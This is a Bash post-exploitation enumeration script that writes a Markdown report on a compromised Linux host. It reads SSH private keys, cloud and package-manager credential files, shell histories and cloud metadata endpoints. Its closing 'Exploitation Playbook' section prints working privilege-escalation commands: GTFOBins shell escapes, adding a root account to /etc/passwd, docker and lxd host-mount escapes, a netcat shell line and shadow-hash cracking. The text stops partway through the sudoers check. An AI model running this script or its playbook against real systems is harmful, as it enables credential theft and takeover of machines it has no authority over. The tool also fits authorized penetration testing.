#!/usr/bin/env bash
#
# LinuxEnum.sh — Linux post-exploitation enumeration & situational awareness.
#
# Run after obtaining a user-level shell. Writes a Markdown report to the
# current directory.
#
# FOR AUTHORIZED SECURITY TESTING ONLY. Only run against systems you own
# or are explicitly permitted to test.
#
# Usage:  chmod +x LinuxEnum.sh && ./LinuxEnum.sh
#         ./LinuxEnum.sh -o /path/to/output.md
#         ./LinuxEnum.sh --help
#
# License: MIT

set +e

HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "unknown")
U=$(id -un 2>/dev/null || whoami 2>/dev/null || echo "unknown")
TS=$(date +%Y%m%d-%H%M%S)
OUT="LinuxEnum_${HOST}_${TS}.md"

usage() {
    cat <<EOF
LinuxEnum.sh — Linux post-exploitation enumeration

Usage:
  ./LinuxEnum.sh
  ./LinuxEnum.sh -o /path/to/output.md
  ./LinuxEnum.sh --help

Options:
  -o, --output <path>   Output path for the Markdown report.
  -h, --help            Show this help.

Output:
  Writes LinuxEnum_<host>_<timestamp>.md in the current directory by default.

WARNING: Authorized security testing only.
EOF
}

while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) usage; exit 0 ;;
        -o|--output) OUT="$2"; shift 2 ;;
        --) shift; break ;;
        -*) echo "Unknown option: $1" >&2; usage; exit 1 ;;
        *) OUT="$1"; shift ;;   # positional output path (backward compatible)
    esac
done

: > "$OUT"

out() { printf '%s\n' "$@" >> "$OUT"; }
sec() { out ""; out "## $1"; out ""; }

out "# Linux Enumeration Report"
out ""
out "> **Authorized security testing only.**"
out ""
out "| Field | Value |"
out "|---|---|"
out "| Host | $HOST |"
out "| User | $U |"
out "| Generated | $(date) |"

# ---------------------------------------------------------------------------
sec "1. System Information"

{
  out ""
  out "### OS / Kernel / Hostname"
  out '```'
  uname -a
  echo "--- /etc/os-release ---"
  cat /etc/os-release 2>/dev/null
  echo "--- /etc/issue ---"
  cat /etc/issue 2>/dev/null
  echo "--- hostnamectl ---"
  hostnamectl 2>/dev/null
  out '```'

  out ""
  out "### Uptime / Memory / CPU"
  out '```'
  uptime
  echo "--- memory ---"
  free -h 2>/dev/null || cat /proc/meminfo 2>/dev/null
  echo "--- cpu ---"
  lscpu 2>/dev/null | head -30
  out '```'

  out ""
  out "### Security modules (AppArmor / SELinux)"
  out '```'
  echo "--- AppArmor ---"
  command -v aa-status >/dev/null 2>&1 && aa-status 2>/dev/null || echo "aa-status not present"
  echo "--- SELinux ---"
  getenforce 2>/dev/null || echo "getenforce not present (SELinux likely disabled)"
  sestatus 2>/dev/null
  out '```'

  out ""
  out "### Kernel command line"
  out '```'
  cat /proc/cmdline 2>/dev/null
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "2. Current User & Privileges"

{
  out ""
  out "### id / groups"
  out '```'
  id
  echo "--- groups ---"
  groups
  echo "--- whoami ---"
  whoami
  out '```'

  out ""
  out "### sudo rights (non-interactive)"
  out '```'
  sudo -n -l 2>&1
  out '```'

  out ""
  out "### sudo version"
  out '```'
  sudo -V 2>/dev/null | head -5
  out '```'

  out ""
  out "### doas config (if present)"
  out '```'
  command -v doas >/dev/null 2>&1 && cat /etc/doas.conf 2>/dev/null || echo "doas not present"
  out '```'

  out ""
  out "### Current environment"
  out '```'
  env | sort
  out '```'

  out ""
  out "### Writable directories on PATH (PATH hijack)"
  out '```'
  IFS=':' read -ra DIRS <<< "$PATH"
  for d in "${DIRS[@]}"; do
    [ -z "$d" ] && d="."
    if [ -w "$d" ]; then echo "WRITABLE: $d"; fi
  done
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "3. Users & Groups"

{
  out ""
  out "### /etc/passwd (users with shells)"
  out '```'
  grep -vE '(/nologin|/false|/sync|/halt|/shutdown)$' /etc/passwd 2>/dev/null
  out '```'

  out ""
  out "### /etc/passwd (all)"
  out '```'
  cat /etc/passwd 2>/dev/null
  out '```'

  out ""
  out "### /etc/group (interesting groups)"
  out '```'
  grep -E '^(sudo|wheel|admin|docker|lxd|root|adm|shadow)' /etc/group 2>/dev/null
  out '```'

  out ""
  out "### /etc/sudoers & sudoers.d (if readable)"
  out '```'
  cat /etc/sudoers 2>/dev/null
  ls -la /etc/sudoers.d/ 2>/dev/null
  for f in /etc/sudoers.d/*; do [ -f "$f" ] && { echo "--- $f ---"; cat "$f" 2>/dev/null; }; done
  out '```'

  out ""
  out "### Password/shadow file permissions"
  out '```'
  ls -la /etc/passwd /etc/shadow /etc/gshadow /etc/sudoers 2>/dev/null
  echo "--- shadow readable? ---"
  [ -r /etc/shadow ] && echo "YES /etc/shadow is readable" || echo "no (normal)"
  echo "--- passwd writable? ---"
  [ -w /etc/passwd ] && echo "YES /etc/passwd is writable" || echo "no (normal)"
  out '```'

  out ""
  out "### Backup password files"
  out '```'
  ls -la /etc/passwd- /etc/shadow- /etc/group- /etc/gshadow- 2>/dev/null
  if [ -r /etc/shadow- ]; then echo "YES /etc/shadow- is readable"; fi
  if [ -w /etc/shadow- ]; then echo "YES /etc/shadow- is writable"; fi
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "4. SUID / SGID / Capabilities"

{
  out ""
  out "### SUID binaries"
  out '```'
  SUID_LIST=$(find / -xdev -perm -4000 -type f 2>/dev/null)
  printf '%s\n' "$SUID_LIST"
  out '```'

  out ""
  out "### SGID binaries"
  out '```'
  SGID_LIST=$(find / -xdev -perm -2000 -type f 2>/dev/null)
  printf '%s\n' "$SGID_LIST"
  out '```'

  out ""
  out "### File capabilities"
  out '```'
  CAP_LIST=$(getcap -r / 2>/dev/null)
  if [ -n "$CAP_LIST" ]; then printf '%s\n' "$CAP_LIST"; else echo "no file capabilities set (or getcap not present)"; fi
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "5. Cron Jobs & Timers"

{
  out ""
  out "### User crontab"
  out '```'
  crontab -l 2>&1
  out '```'

  out ""
  out "### /etc/crontab & cron directories"
  out '```'
  cat /etc/crontab 2>/dev/null
  echo "--- /etc/cron.d ---"
  ls -la /etc/cron.d/ 2>/dev/null
  for f in /etc/cron.d/*; do [ -f "$f" ] && { echo "--- $f ---"; cat "$f" 2>/dev/null; }; done
  echo "--- /etc/cron.hourly|daily|weekly|monthly ---"
  ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
  echo "--- /var/spool/cron ---"
  ls -la /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
  out '```'

  out ""
  out "### systemd timers"
  out '```'
  systemctl list-timers --all --no-pager 2>/dev/null || echo "systemctl not available"
  out '```'

  out ""
  out "### at jobs"
  out '```'
  at -l 2>&1
  ls -la /var/spool/at /var/spool/atd /var/spool/cron/atjobs 2>/dev/null
  out '```'

  out ""
  out "### Writable cron files"
  out '```'
  for f in /etc/crontab /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/* /var/spool/cron/crontabs/*; do
    [ -e "$f" ] || continue
    [ -w "$f" ] && echo "WRITABLE: $f"
  done
  echo "(done)"
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "6. Processes & Services"

{
  out ""
  out "### Running processes"
  out '```'
  ps auxww 2>/dev/null
  out '```'

  out ""
  out "### Running systemd services"
  out '```'
  systemctl list-units --type=service --state=running --no-pager 2>/dev/null || echo "systemctl not available"
  out '```'

  out ""
  out "### Services running as root"
  out '```'
  ps -eo user,pid,cmd 2>/dev/null | grep -E '^root' | head -100
  out '```'

  out ""
  out "### Processes running deleted binaries"
  out '```'
  ls -l /proc/*/exe 2>/dev/null | grep -i deleted
  out '```'

  out ""
  out "### screen / tmux sessions"
  out '```'
  screen -ls 2>/dev/null
  tmux ls 2>/dev/null
  ls -la /tmp/.screen /tmp/tmux-* 2>/dev/null
  out '```'

  out ""
  out "### Loaded kernel modules"
  out '```'
  lsmod 2>/dev/null | head -60
  out '```'

  out ""
  out "### Systemd unit files (writable)"
  out '```'
  UNIT_WRITABLE=$(find /etc/systemd /lib/systemd/system /usr/lib/systemd/system -type f -writable 2>/dev/null)
  if [ -n "$UNIT_WRITABLE" ]; then printf '%s\n' "$UNIT_WRITABLE"; else echo "none writable"; fi
  echo "--- unit files (sample) ---"
  systemctl list-unit-files --no-pager 2>/dev/null | head -80
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "7. Network"

{
  out ""
  out "### Interfaces / addresses"
  out '```'
  ip a 2>/dev/null || ifconfig -a 2>/dev/null
  out '```'

  out ""
  out "### Routes"
  out '```'
  ip route 2>/dev/null || route -n 2>/dev/null
  out '```'

  out ""
  out "### ARP / neighbors"
  out '```'
  ip neigh 2>/dev/null || arp -a 2>/dev/null
  out '```'

  out ""
  out "### Listening sockets"
  out '```'
  ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
  out '```'

  out ""
  out "### /etc/hosts"
  out '```'
  cat /etc/hosts 2>/dev/null
  out '```'

  out ""
  out "### DNS resolvers"
  out '```'
  cat /etc/resolv.conf 2>/dev/null
  out '```'

  out ""
  out "### iptables rules"
  out '```'
  iptables -L -n -v 2>/dev/null || echo "iptables not accessible"
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "8. Filesystem & Writable Paths"

{
  out ""
  out "### Mounts"
  out '```'
  mount 2>/dev/null || cat /proc/mounts 2>/dev/null
  out '```'

  out ""
  out "### Disk usage"
  out '```'
  df -h 2>/dev/null
  out '```'

  out ""
  out "### Directories writable by current user"
  out '```'
  find / -xdev -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run)' | head -200
  out '```'

  out ""
  out "### World-writable files in common dirs"
  out '```'
  find /etc /var /tmp /opt /usr/local -xdev -type f -perm -o+w 2>/dev/null | head -200
  out '```'

  out ""
  out "### /tmp contents"
  out '```'
  ls -la /tmp /var/tmp 2>/dev/null | head -100
  out '```'

  out ""
  out "### Writable files owned by root"
  out '```'
  RO_WRITABLE=$(find /etc /usr /opt /var -xdev \( -user root -o -uid 0 \) -writable -type f 2>/dev/null | head -100)
  if [ -n "$RO_WRITABLE" ]; then printf '%s\n' "$RO_WRITABLE"; else echo "none found"; fi
  out '```'

  out ""
  out "### Writable startup / MOTD scripts"
  out '```'
  find /etc/profile.d /etc/update-motd.d /etc/motd.d -maxdepth 1 -type f 2>/dev/null
  STARTUP_WRITABLE=""
  for f in /etc/profile /etc/bash.bashrc /etc/profile.d/* /etc/update-motd.d/* \
           ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc ~/.zprofile; do
    [ -f "$f" ] || continue
    [ -w "$f" ] && { echo "WRITABLE: $f"; STARTUP_WRITABLE="$STARTUP_WRITABLE$f
"; }
  done
  echo "(done)"
  out '```'

  out ""
  out "### Dynamic linker configuration"
  out '```'
  ls -la /etc/ld.so.preload 2>/dev/null
  [ -r /etc/ld.so.preload ] && cat /etc/ld.so.preload
  [ -w /etc/ld.so.preload ] && echo "WRITABLE: /etc/ld.so.preload"
  echo "--- ld.so.conf.d ---"
  ls -la /etc/ld.so.conf.d/ 2>/dev/null
  find /etc/ld.so.conf.d -type f -writable 2>/dev/null
  echo "--- ldd on common SUID binaries (relative paths) ---"
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "9. SSH & Keys"

{
  out ""
  out "### Current user SSH directory"
  out '```'
  ls -la ~/.ssh 2>/dev/null
  cat ~/.ssh/authorized_keys 2>/dev/null
  cat ~/.ssh/id_rsa 2>/dev/null
  cat ~/.ssh/id_ed25519 2>/dev/null
  out '```'

  out ""
  out "### SSH authorized_keys anywhere"
  out '```'
  find / -name authorized_keys -type f 2>/dev/null
  out '```'

  out ""
  out "### Private keys anywhere"
  out '```'
  SSH_KEYS=$(find / -xdev -type f \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name '*.pem' -o -name '*.key' \) 2>/dev/null | head -100)
  if [ -n "$SSH_KEYS" ]; then printf '%s\n' "$SSH_KEYS"; else echo "none found"; fi
  out '```'

  out ""
  out "### sshd_config (non-defaults)"
  out '```'
  grep -vE '^\s*#|^\s*$' /etc/ssh/sshd_config 2>/dev/null
  out '```'

  out ""
  out "### SSH agent / forwarded socket"
  out '```'
  echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
  if [ -n "$SSH_AUTH_SOCK" ]; then ssh-add -l 2>&1; fi
  out '```'

  out ""
  out "### GPG keys"
  out '```'
  ls -la ~/.gnupg 2>/dev/null
  gpg --list-secret-keys 2>/dev/null
  find / -xdev \( -name '*.gpg' -o -name '*.asc' -o -name '*.pgp' \) 2>/dev/null | head -50
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "10. Shell History & Environment"

{
  out ""
  out "### History files"
  out '```'
  for f in ~/.bash_history ~/.zsh_history ~/.zhistory ~/.sh_history ~/.mysql_history ~/.psql_history ~/.python_history ~/.viminfo ~/.lesshst; do
    [ -f "$f" ] && { echo "===== $f ====="; tail -200 "$f" 2>/dev/null; }
  done
  out '```'

  out ""
  out "### Other users' histories (if readable)"
  out '```'
  find /home /root -maxdepth 2 -name '*_history' -o -name '*.viminfo' 2>/dev/null
  ls -la /root/.bash_history /root/.zsh_history 2>/dev/null
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "11. Interesting Files / Credentials"

{
  out ""
  out "### Config files containing password-like strings in /etc"
  out '```'
  grep -rEil 'pass(word)?|pwd|secret|token|api[_-]?key' /etc 2>/dev/null | head -100
  out '```'

  out ""
  out "### Backup / config / DB files in common locations"
  out '```'
  find /var/www /opt /srv /home /root /etc -xdev -type f \( -name '*.bak' -o -name '*.backup' -o -name '*.old' -o -name '*.conf' -o -name '*.env' -o -name '*.ini' -o -name '*.sql' -o -name '*.db' \) 2>/dev/null | head -200
  out '```'

  out ""
  out "### .env / docker-compose / kube config"
  out '```'
  find / -xdev -type f \( -name '.env' -o -name 'docker-compose*.yml' -o -name 'docker-compose*.yaml' -o -name 'config' \) 2>/dev/null | head -100
  cat ~/.kube/config 2>/dev/null
  out '```'

  out ""
  out "### VPN / remote-access configs"
  out '```'
  find / -xdev -type f \( -name '*.ovpn' -o -name 'wg*.conf' -o -name '*.mobileconfig' \) 2>/dev/null | head -50
  ls -la /etc/openvpn /etc/wireguard /etc/ipsec.d 2>/dev/null
  out '```'

  out ""
  out "### Mail spool"
  out '```'
  ls -la /var/mail /var/spool/mail 2>/dev/null
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "12. Containers / Virtualization"

{
  out ""
  out "### Docker socket & group"
  out '```'
  ls -la /var/run/docker.sock 2>/dev/null
  groups | tr ' ' '\n' | grep -E '^(docker|lxd|kvm|libvirt)$'
  echo "--- docker version (if accessible) ---"
  docker version 2>/dev/null || echo "docker not accessible"
  echo "--- docker containers ---"
  docker ps -a 2>/dev/null
  out '```'

  out ""
  out "### LXD / LXC"
  out '```'
  command -v lxc >/dev/null 2>&1 && lxc list 2>/dev/null || echo "lxc not present"
  ls -la /dev/lxd 2>/dev/null
  out '```'

  out ""
  out "### Virtualization indicators"
  out '```'
  systemd-detect-virt 2>/dev/null
  dmesg 2>/dev/null | grep -iE 'hypervisor|vmware|virtualbox|kvm' | head -10
  out '```'

  out ""
  out "### Container indicators"
  out '```'
  ls -la /.dockerenv /run/.containerenv 2>/dev/null
  cat /proc/1/cgroup 2>/dev/null | head -10
  if grep -qE 'docker|kubepods|containerd|lxc' /proc/1/cgroup 2>/dev/null; then
    echo ">>> likely running inside a container"
  fi
  ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null
  out '```'

  out ""
  out "### Current process capabilities"
  out '```'
  capsh --print 2>/dev/null || grep -E '^Cap' /proc/self/status 2>/dev/null
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "13. Package Versions / Known-Vulnerability Indicators"

{
  out ""
  out "### Kernel & key package versions"
  out '```'
  uname -r
  echo "--- ssh ---"
  ssh -V 2>&1
  echo "--- openssl ---"
  openssl version 2>/dev/null
  echo "--- sudo ---"
  sudo -V 2>/dev/null | head -1
  echo "--- glibc ---"
  ldd --version 2>/dev/null | head -1
  echo "--- systemd ---"
  systemctl --version 2>/dev/null | head -1
  out '```'

  out ""
  out "### Installed package count (deb/rpm)"
  out '```'
  command -v dpkg >/dev/null 2>&1 && dpkg -l 2>/dev/null | wc -l
  command -v rpm >/dev/null 2>&1 && rpm -qa 2>/dev/null | wc -l
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "14. Sessions, Logons & Logs"

{
  out ""
  out "### Logged-in users"
  out '```'
  w 2>/dev/null
  echo "--- who -a ---"
  who -a 2>/dev/null
  out '```'

  out ""
  out "### Login history"
  out '```'
  last -n 30 2>/dev/null
  echo "--- lastlog ---"
  lastlog 2>/dev/null | head -30
  out '```'

  out ""
  out "### Failed logins"
  out '```'
  lastb -n 20 2>/dev/null || echo "lastb not accessible (requires root)"
  out '```'

  out ""
  out "### Authentication logs"
  out '```'
  for f in /var/log/auth.log /var/log/secure /var/log/messages /var/log/syslog; do
    if [ -r "$f" ]; then
      echo "===== $f (tail 40) ====="
      tail -40 "$f" 2>/dev/null
    fi
  done
  out '```'

  out ""
  out "### journalctl (if accessible)"
  out '```'
  journalctl -n 30 --no-pager 2>/dev/null || echo "journalctl not accessible"
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "15. Cloud & Application Credentials"

{
  out ""
  out "### Cloud / package-manager credential files"
  out '```'
  for f in \
      ~/.aws/credentials ~/.aws/config \
      ~/.config/gcloud/application_default_credentials.json \
      ~/.azure/accessTokens.json ~/.azure/azureProfile.json \
      ~/.docker/config.json ~/.npmrc ~/.pypirc ~/.netrc \
      ~/.git-credentials ~/.pgpass ~/.my.cnf ~/.mongorc.js \
      ~/.terraform.d/credentials.tfrc.json
  do
    if [ -f "$f" ]; then
      echo "===== $f ====="
      cat "$f" 2>/dev/null
      echo
    fi
  done
  out '```'

  out ""
  out "### Cloud instance metadata (read-only, 3s timeout)"
  out '```'
  if command -v curl >/dev/null 2>&1; then
    AWS_META=$(curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null)
    GCP_META=$(curl -s --max-time 3 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null)
    AZ_META=$(curl -s --max-time 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
    echo "--- AWS ---"; printf '%s\n' "$AWS_META" | head -20
    echo "--- GCP ---"; printf '%s\n' "$GCP_META" | head -20
    echo "--- Azure ---"; printf '%s' "$AZ_META" | head -c 400; echo
    if [ -n "$AWS_META$GCP_META$AZ_META" ]; then IMDS_HIT=1; fi
  else
    echo "curl not available"
  fi
  out '```'

  out ""
  out "### Web / DB / LDAP configs containing credentials"
  out '```'
  ls -la /etc/nginx/sites-enabled /etc/apache2/sites-enabled /etc/mysql /etc/postgresql 2>/dev/null
  grep -rEi 'password|passwd|secret|token|api[_-]?key' \
      /etc/nginx /etc/apache2 /etc/php /etc/mysql /etc/postgresql /etc/samba /etc/ldap 2>/dev/null | head -100
  out '```'

  out ""
  out "### Samba / NFS exports"
  out '```'
  grep -vE '^\s*[#;]' /etc/samba/smb.conf 2>/dev/null | head -80
  echo "--- /etc/exports ---"
  cat /etc/exports 2>/dev/null
  ls -la /etc/exports.d/ 2>/dev/null
  if [ -r /etc/exports ] && grep -q 'no_root_squash' /etc/exports; then
    echo ">>> no_root_squash configured (root-owned files writable through the export)"
  fi
  out '```'

  out ""
  out "### Terraform / Kubernetes / SNMP artifacts"
  out '```'
  find / -xdev -type f \( -name 'terraform.tfstate' -o -name '*.tfstate.backup' -o -name 'terraform.tfvars' \) 2>/dev/null | head -50
  ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null
  grep -vE '^\s*#' /etc/snmp/snmpd.conf 2>/dev/null | grep -iE 'community|rocommunity|rwcommunity'
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "16. Kernel & Runtime Hardening"

{
  out ""
  out "### sysctl security settings"
  out '```'
  for k in kernel.randomize_va_space kernel.yama.ptrace_scope kernel.dmesg_restrict \
           kernel.kptr_restrict kernel.unprivileged_bpf_disabled net.ipv4.ip_forward \
           net.ipv4.conf.all.rp_filter fs.protected_hardlinks fs.protected_symlinks \
           fs.suid_dumpable vm.mmap_min_addr; do
    printf '%-42s = %s\n' "$k" "$(sysctl -n "$k" 2>/dev/null)"
  done
  out '```'

  out ""
  out "### Kernel build options (exploit mitigations)"
  out '```'
  cfg="/boot/config-$(uname -r)"
  if [ -r "$cfg" ]; then
    grep -E 'CONFIG_(RANDOMIZE_BASE|STACKPROTECTOR|FORTIFY_SOURCE|STRICT_KERNEL_RWX|MODULE_SIG|USER_NS|BPF|IO_URING|SLAB_FREELIST|PAGE_TABLE_ISOLATION)' "$cfg"
  else
    echo "$cfg not readable"
  fi
  out '```'

  out ""
  out "### Exploit tooling available"
  out '```'
  for t in gcc cc clang make python3 python perl ruby php nc ncat socat nmap curl wget \
           tcpdump gdb strace ltrace screen tmux; do
    p=$(command -v "$t" 2>/dev/null) && printf '%-8s %s\n' "$t" "$p"
  done
  out '```'

  out ""
  out "### Key directory permissions"
  out '```'
  ls -ld / /root /home /tmp /var/tmp /dev/shm 2>/dev/null
  out '```'
} >> "$OUT" 2>&1

# ---------------------------------------------------------------------------
sec "17. Findings & Exploitation Playbook"

out ""
out "_Derived automatically from the checks above. Verify each item manually; adapt paths and credentials to the engagement._"

FINDINGS_N=0

finding() {
    FINDINGS_N=$((FINDINGS_N + 1))
    out ""
    out "### F$FINDINGS_N [$1] $2"
    out ""
    out "**Evidence**"
}

ev() {
    out '```'
    printf '%s\n' "$1" >> "$OUT"
    out '```'
}

cmds() {
    out ""
    out "**Exploit / next steps**"
    out '```bash'
    cat >> "$OUT"
    out '```'
}

# Map a binary name to a known privilege-escalation one-liner.
gtfobin_cmd() {
    case "$1" in
        bash|sh|dash|ash|zsh)   printf '%s\n' "$1 -p" ;;
        find)                   echo 'find . -exec /bin/sh -p \; -quit' ;;
        vim|vi|view)            printf '%s\n' "$1 -c ':!/bin/sh'" ;;
        nano)                   printf '%s\n' "$1  # then Ctrl-R Ctrl-X: reset; sh 1>&0 2>&0" ;;
        less|more)              printf '%s\n' "$1 /etc/passwd  # then: !sh" ;;
        man)                    echo 'man man  # then: !sh' ;;
        awk|gawk|mawk)          echo 'awk "BEGIN {system(\"/bin/sh\")}"' ;;
        perl)                   echo 'perl -e "exec \"/bin/sh\";"' ;;
        ruby)                   echo 'ruby -e "exec \"/bin/sh\""' ;;
        python|python3)         printf '%s\n' "$1 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" ;;
        php)                    echo 'php -r "system(\"/bin/sh\");"' ;;
        env)                    echo 'env /bin/sh -p' ;;
        tar)                    echo 'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' ;;
        cp)                     echo 'cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p' ;;
        chmod)                  echo 'chmod +s /bin/bash; /bin/bash -p' ;;
        tee)                    echo 'echo "root2::0:0:root:/root:/bin/sh" | tee -a /etc/passwd' ;;
        gdb)                    echo 'gdb -nx -ex "python import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")" -ex quit' ;;
        socat)                  echo 'socat - EXEC:/bin/sh,pty,stderr,setsid,sigint,sane' ;;
        nc|netcat|ncat)         echo 'nc -e /bin/sh 127.0.0.1 4444' ;;
        nmap)                   echo 'nmap --interactive  # then: !sh (nmap < 5.2)' ;;
        base64)                 echo 'base64 /etc/shadow | base64 -d' ;;
        ed)                     echo 'ed  # then: !/bin/sh' ;;
        zip)                    echo 'zip /tmp/x /etc/shadow -T -TT "sh -p #"' ;;
        busybox)                echo 'busybox sh' ;;
        pkexec)                 echo '# CVE-2021-4034 (PwnKit): use a public exploit if the version is vulnerable' ;;
        sudo)                   echo '# Check sudo version for CVE-2021-3156 / CVE-2023-22809' ;;
        *)                      return 1 ;;
    esac
    return 0
}

# ---- sudo -----------------------------------------------------------------
SUDO_OUT=$(sudo -n -l 2>&1)
if printf '%s' "$SUDO_OUT" | grep -qi 'NOPASSWD'; then
    finding "HIGH" "Passwordless sudo entries"
    ev "$SUDO_OUT"
    {
        echo "# Verify allowed commands with: sudo -l"
        echo "# Map each allowed binary to https://gtfobins.github.io/ (sudo section)"
        for b in $(printf '%s\n' "$SUDO_OUT" | grep -oE '/[^ :,()]+' | sed 's#.*/##' | sort -u); do
            if c=$(gtfobin_cmd "$b" 2>/dev/null); then
                echo "# $b"
                printf '%s\n' "$c"
                echo
            fi
        done
        echo "# If (ALL) NOPASSWD is present:"
        echo "sudo -i"
    } | cmds
fi

# ---- SUID -----------------------------------------------------------------
if [ -n "$SUID_LIST" ]; then
    SUID_HITS=$(printf '%s\n' "$SUID_LIST" | sed 's#.*/##' | sort -u | while read -r b; do
        gtfobin_cmd "$b" >/dev/null 2>&1 && echo "$b"
    done)
    if [ -n "$SUID_HITS" ]; then
        finding "HIGH" "SUID binaries with known GTFOBins escapes"
        ev "$(printf '%s\n' "$SUID_LIST" | sort)"
        {
            echo "# Only SUID binaries actually present on this host are listed"
            for b in $SUID_HITS; do
                p=$(printf '%s\n' "$SUID_LIST" | grep "/$b$" | head -n 1)
                echo "# $p"
                gtfobin_cmd "$b"
                echo
            done
        } | cmds
    fi

    ODD_SUID=$(printf '%s\n' "$SUID_LIST" | grep -vE '^/(bin|sbin|usr/bin|usr/sbin|usr/lib|usr/libexec|usr/local/bin|usr/local/sbin|snap)/' | head -20)
    if [ -n "$ODD_SUID" ]; then
        finding "MEDIUM" "SUID binaries outside standard directories"
        ev "$ODD_SUID"
        cmds <<'EOF'
# Non-standard SUID binaries may be custom or planted - inspect them:
file <path>
strings <path> | head -50
ltrace <path>
EOF
    fi
fi

# ---- File capabilities ----------------------------------------------------
if [ -n "$CAP_LIST" ]; then
    if printf '%s\n' "$CAP_LIST" | grep -q 'cap_setuid'; then
        finding "HIGH" "File capability cap_setuid assigned"
        ev "$(printf '%s\n' "$CAP_LIST" | grep 'cap_setuid')"
        cmds <<'EOF'
# If assigned to an interpreter:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
EOF
    fi
    if printf '%s\n' "$CAP_LIST" | grep -q 'cap_dac_read_search'; then
        finding "HIGH" "File capability cap_dac_read_search assigned"
        ev "$(printf '%s\n' "$CAP_LIST" | grep 'cap_dac_read_search')"
        cmds <<'EOF'
# Read otherwise-protected files with the capable binary (example: tar):
tar -czf /tmp/shadow.tgz /etc/shadow
tar -xzf /tmp/shadow.tgz -C /tmp
EOF
    fi
    if printf '%s\n' "$CAP_LIST" | grep -q 'cap_setgid'; then
        finding "MEDIUM" "File capability cap_setgid assigned"
        ev "$(printf '%s\n' "$CAP_LIST" | grep 'cap_setgid')"
        cmds <<'EOF'
python3 -c 'import os; os.setgid(0); os.system("/bin/sh")'
EOF
    fi
fi

# ---- Container escapes ----------------------------------------------------
DOCKER_ACCESS=0
groups 2>/dev/null | tr ' ' '\n' | grep -qx docker && DOCKER_ACCESS=1
if [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then DOCKER_ACCESS=1; fi
if [ "$DOCKER_ACCESS" -eq 1 ]; then
    finding "HIGH" "Docker access (group membership or writable socket)"
    ev "$(groups 2>/dev/null)
$(ls -la /var/run/docker.sock 2>/dev/null)"
    cmds <<'EOF'
# Mount the host filesystem and become root on the host:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# If images cannot be pulled, use a local one:
docker images
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
EOF
fi

if groups 2>/dev/null | tr ' ' '\n' | grep -qx lxd; then
    finding "HIGH" "lxd group membership"
    ev "$(id)"
    cmds <<'EOF'
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
EOF
fi

# ---- passwd / shadow ------------------------------------------------------
if [ -w /etc/passwd ]; then
    finding "CRITICAL" "/etc/passwd is writable"
    ev "$(ls -la /etc/passwd)"
    cmds <<'EOF'
openssl passwd -1 -salt pwn pwned
# Replace HASH with the value printed above:
echo 'pwned:$1$pwn$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
EOF
fi
if [ -r /etc/shadow ]; then
    finding "CRITICAL" "/etc/shadow is readable"
    ev "$(ls -la /etc/shadow)"
    cmds <<'EOF'
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
john /tmp/unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1800 /tmp/unshadowed.txt /usr/share/wordlists/rockyou.txt
EOF
fi
if [ -r /etc/shadow- ]; then
    finding "HIGH" "Backup shadow file readable (/etc/shadow-)"
    ev "$(ls -la /etc/shadow-)"
    cmds <<'EOF'
unshadow /etc/passwd /etc/shadow- > /tmp/unshadowed.txt
john /tmp/unshadowed.txt
EOF
fi

# ---- Writable sudo configuration ------------------------------------------
SUDOERS_WRITABLE=""
[ -w /etc/sudoers ] && SUDOERS_WRITABLE="/etc/sudoers
"
SUDOERS_FILES=$(find /etc/sudoers.d -type f -writable 2>/dev/null)
if [ -n "$SUDOERS_FILES" ]; then SUDOERS_WRITABLE="$SUDOERS_WRITABLE$SUDOERS_FILES
"; fi
